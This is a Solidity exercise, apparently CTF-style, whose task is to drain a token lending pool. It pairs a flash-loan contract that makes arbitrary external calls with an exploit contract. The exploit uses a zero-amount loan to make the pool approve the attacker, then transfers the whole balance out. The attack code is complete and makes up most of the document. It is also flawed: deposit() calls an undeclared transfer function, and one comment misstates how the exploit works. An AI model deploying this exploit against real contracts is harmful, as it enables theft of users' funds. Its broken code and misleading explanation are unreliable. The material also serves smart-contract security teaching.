/*

LendingPool is offering ERC20 flash loans for free.

import "./IERC20.sol";

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(
        uint _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint balBefore = token.balanceOf(address(this));
        require(balBefore >= _amount, "borrow amount > balance");

        token.transfer(msg.sender, _amount);
        (bool executed, ) = _target.call(_data);
        require(executed, "loan failed");

        uint balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}

Task:
    - Drain all token from LendingPool.

*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(
        uint _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint balBefore = token.balanceOf(address(this));
        require(balBefore >= _amount, "borrow amount > balance");

        token.transfer(msg.sender, _amount);
        (bool executed, ) = _target.call(_data);
        require(executed, "loan failed");

        uint balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    // declare any ERC20 functions that you need to call here
    function balanceOf(address) external view returns (uint);

    function approve(address, uint) external returns (bool);

    function transferFrom(address, address, uint) external returns (bool);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    receive() external payable {}

    function deposit() external payable {
        token.transfer(address(this), msg.value);
    }    

    function pwn() external {
        // retrieve the balance of the lending pool token held by the lending pool contract
        uint bal = token.balanceOf(address(pool)); 

        // exploit leverages the ability to perform flash loans with an amount of 0,
        // effectively allowing the attacker to borrow tokens without collateral
        ILendingPool(pool).flashLoan(
            0, 
            address(token), // specifies the lending pool token as the target
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        // here we receives an approval to transfer tokens from the lending pool
        token.transferFrom(address(pool), address(this), bal);
    }
}
